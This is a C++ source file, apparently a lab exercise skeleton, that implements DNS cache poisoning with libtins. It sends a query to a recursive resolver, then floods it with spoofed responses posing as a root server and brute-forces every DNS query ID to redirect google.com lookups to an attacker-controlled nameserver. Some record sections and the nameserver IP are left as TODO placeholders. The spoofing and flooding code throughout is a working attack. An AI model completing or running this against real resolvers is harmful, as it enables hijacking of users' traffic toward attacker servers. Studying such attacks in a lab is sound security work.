#include <tins/tins.h>
#include <iostream>
#include <string>
#include <cstdlib>
#include <ctime>
#include <chrono>
#include <thread>

using namespace Tins;
using namespace std;

int main() {

    srand(time(0));    // Seed random number generator for DNS query ID

    // Configuration variables
    string target_domain = "google.com";    // Target domain to spoof
    string request_hostname = "www.google.com";    // Target domain to spoof
    string root_ns_ip = "10.0.0.50";    // Spoofed source (pretending to be root DNS)
    string recursive_ns_ip = "10.0.0.40";    // Target recursive DNS server
    string attacker_ip = "10.0.0.10";    // Attacker's IP address
    string attacker_server_ip = "10.0.0.20";    // IP we want to redirect traffic to
    string attacker_ns = "attacker.google.com";    // Attacker's nameserver
    string attacker_ns_ip = TODO;   // Attacker's nameserver IP address
    int recursive_ns_port = 12345;    // Port of recursive DNS server

    PacketSender sender;    // Packet sending utility from libtins

    /**********************************************
     * STEP 1: Send legitimate DNS query to trigger the recursive DNS server
     **********************************************/

    DNS dns;
    dns.id(rand() % 65536);    // Random query ID
    dns.type(DNS::QUERY);    // This is a query packet
    dns.recursion_desired(1);    // Set RD flag to true
    dns.add_query(DNS::Query(
        request_hostname,    // Domain to query
        DNS::A,    // IPv4 address record
        DNS::IN    // Internet class (standard)
    ));

    UDP udp(53, 53);    // Create UDP layer (destination/source port 53)
    udp /= dns;    // Attach DNS payload

    // IP(destination_ip,source_ip)
    IP ip = IP(recursive_ns_ip, attacker_ip) / udp;    // Create IP layer targeting recursive DNS server

    sender.send(ip);    // Send the initial legitimate query

    /**********************************************
     * STEP 2: DNS cache poisoning attack
     * Flood with spoofed responses trying to guess the correct query ID
     **********************************************/
    std::this_thread::sleep_for(std::chrono::milliseconds(721));
    for (int id = 0; id <= 65535; ++id) {
        // Create spoofed DNS answer packet
        DNS dns;
        dns.id(id);    // Try all possible IDs (brute force)
        dns.type(DNS::RESPONSE);    // This is a response packet
        dns.add_query(DNS::Query("_.google.com", DNS::A, DNS::IN));

        TODO // Add the authority section

        TODO // Add the answer section

        dns.add_additional(DNS::Resource(attacker_ns, "2001:db8::1", DNS::AAAA, DNS::IN, 6000));    // Add additional record for IPv6 address

        UDP udp(recursive_ns_port, 53);    // Create UDP layer (source port: 53, destination port 12345)
        udp /= dns;    // Attach DNS payload

        IP ip = IP(recursive_ns_ip, root_ns_ip) / udp;  // Create IP layer targeting recursive DNS server

        sender.send(ip); // Send the spoofed response
        if (id % 1000 == 0) {
            cout << "Sent packet ID: " << id << endl;
        }
    }

    return 0;
}